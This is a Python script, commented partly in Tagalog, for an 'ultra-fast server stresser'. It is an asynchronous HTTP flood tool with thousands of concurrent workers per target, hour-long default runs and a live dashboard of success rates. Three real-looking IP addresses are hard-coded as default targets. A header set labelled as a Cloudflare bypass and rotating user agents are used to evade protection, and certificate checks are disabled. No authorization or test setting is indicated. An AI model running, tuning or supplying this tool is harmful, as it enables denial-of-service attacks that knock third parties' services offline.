#!/usr/bin/env python3
"""
V2 ULTRA-FAST FOCUSED SERVER STRESSER
======================================
Pinaka-mabilis na stresser - auto-detect kung ilang targets
Kung 1 lang, sobrang bilis! Kung multiple, sabay-sabay.
"""

import argparse
import asyncio
import aiohttp
import ssl
import time
import random
import sys
from typing import Optional, List, Dict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich import box
from collections import Counter, defaultdict

# ============================================
# CONFIGURATION
# ============================================

# Default targets - pwede mong baguhin o palitan
DEFAULT_TARGETS = [
    "http://172.67.71.232/",
    "https://62.72.47.119/",
    "https://167.104.100.205/"
]

DEFAULT_CONCURRENCY = 5000
DEFAULT_DURATION = 3600
DEFAULT_RPS = 1000
DEFAULT_TIMEOUT = 60

# SSL Configuration
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# Cloudflare Bypass Headers
HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dnt": "1",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "connection": "keep-alive",
}

# Ultra-Fast User-Agents (rotating)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
]

# ============================================
# DATA CLASSES
# ============================================

class Result:
    __slots__ = ['status', 'latency', 'error', 'target', 'url']
    def __init__(self, status: Optional[int], latency: float, error: Optional[str] = None, target: str = "", url: str = ""):
        self.status = status
        self.latency = latency
        self.error = error
        self.target = target
        self.url = url
    
    @property
    def is_success(self) -> bool:
        return self.status is not None and 200 <= self.status < 400
    
    @property
    def is_cloudflare(self) -> bool:
        return self.status == 403

# ============================================
# ULTRA-FAST WORKER
# ============================================

class UltraFastWorker:
    __slots__ = ['session', 'target', 'url', 'worker_id', 'count', 'headers']
    
    def __init__(self, session: aiohttp.ClientSession, target: Dict, worker_id: int):
        self.session = session
        self.target = target
        self.url = target["url"]
        self.worker_id = worker_id
        self.count = 0
        self.headers = HEADERS.copy()
        self.headers["user-agent"] = random.choice(USER_AGENTS)
    
    async def request(self) -> Result:
        self.count += 1
        
        # Rotate headers every 5 requests for speed
        if self.count % 5 == 0:
            self.headers["user-agent"] = random.choice(USER_AGENTS)
        
        start = time.perf_counter()
        
        try:
            ssl_ctx = SSL_CONTEXT if self.target["protocol"] == "https" else None
            
            async with self.session.get(
                self.url,
                headers=self.headers,
                ssl=ssl_ctx,
                timeout=aiohttp.ClientTimeout(total=DEFAULT_TIMEOUT)
            ) as resp:
                await resp.read()
                latency = time.perf_counter() - start
                
                return Result(
                    status=resp.status,
                    latency=latency,
                    target=self.target["name"],
                    url=self.url
                )
                
        except asyncio.TimeoutError:
            return Result(None, time.perf_counter() - start, "timeout", self.target["name"], self.url)
        except Exception as e:
            return Result(None, time.perf_counter() - start, str(e), self.target["name"], self.url)

# ============================================
# ULTRA-FAST DASHBOARD
# ============================================

class UltraDashboard:
    def __init__(self, console: Console):
        self.console = console
        self.results: List[Result] = []
        self.target_results: Dict[str, List[Result]] = defaultdict(list)
        self.start = time.time()
        self.rps = 0
        self.concurrency = 0
        self.duration = 0
        self.running = True
        self.is_single_target = False
    
    def add(self, result: Result):
        self.results.append(result)
        self.target_results[result.target].append(result)
    
    def get_metrics(self, results: List[Result]) -> Dict:
        if not results:
            return {"total": 0, "success": 0, "rps": 0, "p95": 0, "p99": 0, "rate": 0}
        
        total = len(results)
        success = sum(1 for r in results if r.is_success)
        cloudflare = sum(1 for r in results if r.is_cloudflare)
        latencies = sorted([r.latency for r in results])
        
        elapsed = time.time() - self.start
        rps = total / elapsed if elapsed > 0 else 0
        
        p95 = latencies[int(len(latencies) * 0.95)] if latencies else 0
        p99 = latencies[int(len(latencies) * 0.99)] if latencies else 0
        
        return {
            "total": total,
            "success": success,
            "cloudflare": cloudflare,
            "rps": rps,
            "p95": p95,
            "p99": p99,
            "rate": (success / total * 100) if total > 0 else 0,
            "avg": sum(latencies) / len(latencies) if latencies else 0,
        }
    
    def update(self):
        elapsed = time.time() - self.start
        total = len(self.results)
        
        if total == 0:
            return
        
        self.console.clear()
        
        # Header - mas aggressive kung single target
        if self.is_single_target:
            title = "[bold red]🔥 ULTRA-FAST FOCUSED STRESSER[/bold red]"
        else:
            title = "[bold red]🔥 ULTRA-FAST MULTI STRESSER[/bold red]"
        
        self.console.print(Panel.fit(
            f"{title}\n"
            f"[white]Targets: {len(self.target_results)} | Concurrency: {self.concurrency} | RPS: {self.rps} | Duration: {self.duration}s[/white]\n"
            f"[white]Elapsed: {elapsed:.1f}s | Total Requests: {total:,} | Speed: {total/elapsed:.0f} req/s[/white]",
            border_style="red"
        ))
        
        # Overall Metrics
        m = self.get_metrics(self.results)
        table = Table(show_header=True, box=box.ROUNDED)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        table.add_row("Total RPS", f"[bold green]{m['rps']:.2f}[/bold green]")
        table.add_row("Success Rate", f"{'✅' if m['rate'] > 80 else '⚠️' if m['rate'] > 0 else '❌'} {m['rate']:.1f}%")
        table.add_row("P95 Latency", f"{m['p95']:.3f}s")
        table.add_row("P99 Latency", f"{m['p99']:.3f}s")
        table.add_row("Total Requests", f"{m['total']:,}")
        
        if m['cloudflare'] > 0:
            table.add_row("[red]Cloudflare Blocked[/red]", f"[red]{m['cloudflare']:,}[/red]")
        
        self.console.print(table)
        
        # Per Target - focused kung isa lang
        if self.is_single_target:
            # Single Target - Big and Bold
            for target_name, results in self.target_results.items():
                m = self.get_metrics(results)
                status = "✅ WORKING" if m['rate'] > 80 else "⚠️ PARTIAL" if m['rate'] > 0 else "❌ FAILED"
                color = "green" if m['rate'] > 80 else "yellow" if m['rate'] > 0 else "red"
                
                self.console.print(Panel.fit(
                    f"[bold {color}]🎯 {target_name}[/bold {color}]\n"
                    f"RPS: [bold green]{m['rps']:.2f}[/bold green] | "
                    f"Success: [{'green' if m['rate'] > 80 else 'yellow' if m['rate'] > 0 else 'red'}]{m['rate']:.1f}%[/{'green' if m['rate'] > 80 else 'yellow' if m['rate'] > 0 else 'red'}] | "
                    f"P95: {m['p95']:.3f}s | "
                    f"Requests: {m['total']:,}\n"
                    f"Status: [bold {color}]{status}[/bold {color}]",
                    border_style=color
                ))
        else:
            # Multiple Targets - Compact
            for target_name, results in self.target_results.items():
                m = self.get_metrics(results)
                status = "✅" if m['rate'] > 80 else "⚠️" if m['rate'] > 0 else "❌"
                
                table = Table(show_header=False, box=box.MINIMAL)
                table.add_row(
                    f"{status} {target_name[:20]}",
                    f"RPS: {m['rps']:.1f}",
                    f"Rate: {m['rate']:.0f}%",
                    f"P95: {m['p95']:.3f}s"
                )
                self.console.print(table)
        
        # Progress
        progress = min(elapsed / self.duration, 1.0) if self.duration > 0 else 0
        bar = "█" * int(40 * progress) + "░" * (40 - int(40 * progress))
        self.console.print(f"\n[bold yellow]Progress: {bar} {progress*100:.1f}%[/bold yellow]")
        
        if self.running:
            self.console.print("[bold green]▶ STRESSING... (Ctrl+C to stop)[/bold green]")
        else:
            self.console.print("[bold red]⏹ COMPLETE[/bold red]")

# ============================================
# ULTRA-FAST STRESSER ENGINE
# ============================================

async def worker_loop(
    session: aiohttp.ClientSession,
    target: Dict,
    end_time: float,
    interval: float,
    dashboard: UltraDashboard,
    stop: asyncio.Event,
    wid: int,
) -> None:
    worker = UltraFastWorker(session, target, wid)
    
    while time.time() < end_time and not stop.is_set():
        result = await worker.request()
        dashboard.add(result)
        if interval > 0:
            await asyncio.sleep(interval)

async def run_stresser(
    targets: List[Dict],
    duration: int,
    concurrency: int,
    rps: int,
) -> None:
    console = Console()
    dashboard = UltraDashboard(console)
    dashboard.duration = duration
    dashboard.concurrency = concurrency
    dashboard.rps = rps
    dashboard.is_single_target = len(targets) == 1
    
    stop = asyncio.Event()
    start = time.time()
    end = start + duration
    interval = concurrency / rps if rps > 0 else 0
    
    sessions = []
    workers = []
    
    for target in targets:
        ssl_ctx = SSL_CONTEXT if target["protocol"] == "https" else None
        connector = aiohttp.TCPConnector(
            limit=concurrency,
            limit_per_host=concurrency,
            enable_cleanup_closed=True,
            ssl=ssl_ctx,
            force_close=True,
        )
        
        session = aiohttp.ClientSession(connector=connector, headers=HEADERS)
        sessions.append(session)
        
        for i in range(concurrency):
            w = asyncio.create_task(
                worker_loop(
                    session=session,
                    target=target,
                    end_time=end,
                    interval=interval,
                    dashboard=dashboard,
                    stop=stop,
                    wid=i,
                )
            )
            workers.append(w)
    
    try:
        while time.time() < end and not stop.is_set():
            dashboard.update()
            await asyncio.sleep(0.2)  # Ultra-fast updates
        
        dashboard.running = False
        dashboard.update()
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Stopped by user[/yellow]")
        stop.set()
    
    finally:
        stop.set()
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)
        for s in sessions:
            await s.close()

# ============================================
# PARSE TARGETS
# ============================================

def parse_targets(targets_input: List[str]) -> List[Dict]:
    """Auto-detect targets at protocols"""
    parsed = []
    
    for url in targets_input:
        url = url.strip()
        if not url:
            continue
        
        protocol = "https" if url.startswith("https://") else "http"
        name = url.replace("https://", "").replace("http://", "").split("/")[0]
        
        parsed.append({
            "name": name,
            "url": url,
            "protocol": protocol
        })
    
    return parsed

# ============================================
# COMMAND LINE - SUPER SIMPLE
# ============================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="V2 ULTRA-FAST FOCUSED STRESSER",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  # Single target (ULTRA FAST!)
  python3 v2_stresser.py --target https://167.104.100.205/ --concurrency 1000 --duration 30 --rps 500
  
  # Multiple targets
  python3 v2_stresser.py --targets http://172.67.71.232/ https://62.72.47.119/ https://167.104.100.205/
  
  # Extreme speed
  python3 v2_stresser.py --target https://167.104.100.205/ --concurrency 2000 --rps 1000 --duration 60
        """
    )
    
    parser.add_argument(
        "--target",
        help="Single target URL (auto-detect HTTP/HTTPS)",
    )
    parser.add_argument(
        "--targets",
        nargs="+",
        help="Multiple target URLs",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=DEFAULT_CONCURRENCY,
        help=f"Concurrent workers (default: {DEFAULT_CONCURRENCY})",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=DEFAULT_DURATION,
        help=f"Duration in seconds (default: {DEFAULT_DURATION})",
    )
    parser.add_argument(
        "--rps",
        type=int,
        default=DEFAULT_RPS,
        help=f"Target RPS (default: {DEFAULT_RPS})",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})",
    )
    
    return parser.parse_args()

# ============================================
# FINAL REPORT
# ============================================

def print_final_report(results: List[Result], console: Console, targets: List[Dict]):
    if not results:
        console.print("[red]No requests completed[/red]")
        return
    
    console.print("\n[bold green]✅ STRESS TEST COMPLETE[/bold green]")
    
    total = len(results)
    successes = sum(1 for r in results if r.is_success)
    errors = total - successes
    latencies = sorted([r.latency for r in results])
    
    p50 = latencies[int(len(latencies) * 0.5)] if latencies else 0
    p95 = latencies[int(len(latencies) * 0.95)] if latencies else 0
    p99 = latencies[int(len(latencies) * 0.99)] if latencies else 0
    
    # Main Table
    table = Table(title="📊 FINAL REPORT", box=box.DOUBLE_EDGE)
    table.add_column("Metric", style="cyan bold")
    table.add_column("Value", style="white")
    
    table.add_row("Total Requests", f"{total:,}")
    table.add_row("Successful", f"{successes:,} ({(successes/total*100):.1f}%)")
    table.add_row("Failed", f"{errors:,} ({(errors/total*100):.1f}%)")
    table.add_row("")
    table.add_row("P50 Latency", f"{p50:.3f}s")
    table.add_row("P95 Latency", f"{p95:.3f}s")
    table.add_row("P99 Latency", f"{p99:.3f}s")
    table.add_row("Min Latency", f"{min(latencies):.3f}s")
    table.add_row("Max Latency", f"{max(latencies):.3f}s")
    table.add_row("Avg Latency", f"{(sum(latencies)/len(latencies)):.3f}s")
    
    console.print(table)
    
    # Per Target
    for target in targets:
        target_name = target["name"]
        t_results = [r for r in results if r.target == target_name]
        if not t_results:
            continue
        
        t_total = len(t_results)
        t_success = sum(1 for r in t_results if r.is_success)
        t_lat = sorted([r.latency for r in t_results])
        t_p95 = t_lat[int(len(t_lat) * 0.95)] if t_lat else 0
        
        status = "✅ WORKING" if (t_success/t_total*100) > 80 else "❌ FAILED"
        
        target_table = Table(title=f"🎯 {target_name}", box=box.ROUNDED)
        target_table.add_column("Metric", style="cyan")
        target_table.add_column("Value", style="white")
        
        target_table.add_row("Requests", f"{t_total:,}")
        target_table.add_row("Success Rate", f"{(t_success/t_total*100):.1f}%")
        target_table.add_row("P95", f"{t_p95:.3f}s")
        target_table.add_row("Status", status)
        
        console.print(target_table)

# ============================================
# MAIN
# ============================================

async def main_async(args):
    console = Console()
    
    # Determine targets
    if args.target:
        targets_input = [args.target]
    elif args.targets:
        targets_input = args.targets
    else:
        targets_input = DEFAULT_TARGETS
    
    targets = parse_targets(targets_input)
    
    if not targets:
        console.print("[red]❌ No targets specified![/red]")
        return
    
    # Show banner
    is_single = len(targets) == 1
    mode = "🎯 FOCUSED MODE" if is_single else "🌐 MULTI-TARGET MODE"
    
    console.print(Panel.fit(
        f"[bold red]🔥 V2 ULTRA-FAST STRESSER[/bold red]\n"
        f"[white]{mode}[/white]\n"
        f"[white]Targets: {len(targets)}[/white]\n"
        f"[white]Concurrency: {args.concurrency} per target[/white]\n"
        f"[white]Duration: {args.duration}s | RPS: {args.rps} | Timeout: {args.timeout}s[/white]\n"
        f"[{'green' if is_single else 'yellow'}]Speed Mode: {'ULTRA FAST' if is_single else 'NORMAL'}[/{'green' if is_single else 'yellow'}]",
        border_style="red"
    ))
    
    # Show targets
    target_table = Table(title="🎯 Targets", box=box.ROUNDED)
    target_table.add_column("#", style="cyan")
    target_table.add_column("URL", style="white")
    target_table.add_column("Protocol", style="white")
    
    for i, target in enumerate(targets, 1):
        color = "green" if target["protocol"] == "https" else "yellow"
        target_table.add_row(
            str(i),
            target["url"],
            f"[{color}]{target['protocol']}[/{color}]"
        )
    console.print(target_table)
    
    if is_single:
        console.print(f"\n[bold green]⚡ ULTRA-FAST MODE ACTIVATED! Focusing on single target![/bold green]")
    else:
        console.print(f"\n[yellow]🌐 Multi-target mode - {len(targets)} targets simultaneously[/yellow]")
    
    console.print("\n[yellow]Press Ctrl+C to stop[/yellow]\n")
    
    # Update global timeout
    global DEFAULT_TIMEOUT
    DEFAULT_TIMEOUT = args.timeout
    
    # Run stresser
    await run_stresser(
        targets=targets,
        duration=args.duration,
        concurrency=args.concurrency,
        rps=args.rps,
    )
    
    # Note: Results are displayed in dashboard

def main():
    args = parse_args()
    
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        console = Console()
        console.print("\n\n[yellow]⚠️ Stopped by user.[/yellow]")
        sys.exit(0)
    except Exception as e:
        console = Console()
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")
        sys.exit(1)

if __name__ == "__main__":
    main()